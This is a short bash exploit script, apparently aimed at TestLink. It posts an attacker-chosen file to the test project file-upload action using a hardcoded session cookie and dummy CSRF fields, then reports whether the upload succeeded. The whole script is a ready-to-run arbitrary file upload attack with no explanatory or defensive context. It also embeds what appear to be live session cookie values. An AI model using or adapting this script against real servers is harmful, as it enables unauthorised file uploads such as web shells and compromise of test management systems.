#!/bin/bash
# PS: Change the Cookie Value before of launch the exploit 

HOST=$1
FILE=$2
PROJECTID=$3

if [ -z $HOST ] || [ -z $FILE ] || [ -z $PROJECTID ] 
then
    echo 'Usage: ./uploadFiles.sh HOST FILE_PATH PROJECTID';
else
    RESPONSE=$(curl -s -F 'CSRFName=rapt00r' -F 'CSRFToken=rapt00r' -F 'MAX_FILE_SIZE=1048576' -F 'uploadedFile=@'$FILE "http://"$HOST"/lib/testcases/containerEdit.php?containerType=testproject&doAction=fileUpload&tprojectID="$PROJECTID -H "Cookie: PHPSESSID=spesoq4qrbd1q88h47qhbh3cr2; TESTLINK_USER_AUTH_COOKIE=854053dbbf6482b1f59208fcac7eb14ef05dd6855dc5ced499792f0009b5a640; ys-edit_tc_tproject_id_1_ext-comp-1001=a%3As%253A/1; TESTLINK197TL_lastTestPlanForUserID_1=11; TL_lastTestProjectForUserID_4=5; ys-edit_tc_tproject_id_5_ext-comp-1001=a%3As%253A/5")
    if (echo $RESPONSE | grep "login.php?note=expired&destination=" > /dev/null)
    then
        echo "The File Don't has uploaded";
    else
        echo "The File has been uploaded";
    fi
fi